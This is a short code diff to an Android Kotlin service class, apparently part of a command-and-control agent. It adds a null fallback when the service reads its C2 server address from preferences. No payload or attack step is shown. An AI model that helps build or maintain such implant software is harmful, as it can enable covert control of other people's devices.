@@ -110,7 +110,7 @@ class AgentService : Service() {
 
     private fun getC2Server(): String {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER)
+        return prefs.getString(KEY_C2_SERVER, DEFAULT_C2_SERVER) ?: DEFAULT_C2_SERVER
     }
 
     private fun acquireWakeLock() {
